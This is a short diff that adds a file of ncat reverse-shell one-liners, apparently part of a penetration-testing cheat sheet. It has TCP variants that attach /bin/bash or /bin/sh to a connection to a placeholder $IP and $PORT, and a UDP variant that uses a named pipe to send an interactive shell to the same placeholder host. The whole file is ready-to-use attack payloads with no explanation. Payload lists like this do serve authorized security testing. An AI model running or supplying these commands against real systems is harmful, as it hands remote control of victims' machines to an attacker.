@@ -1,0 +1,5 @@
+NCAT TCP
+ncat $IP $PORT -e /bin/bash
+ncat $IP $PORT -e /bin/sh
+NCAT UDP
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u $IP $PORT >/tmp/f
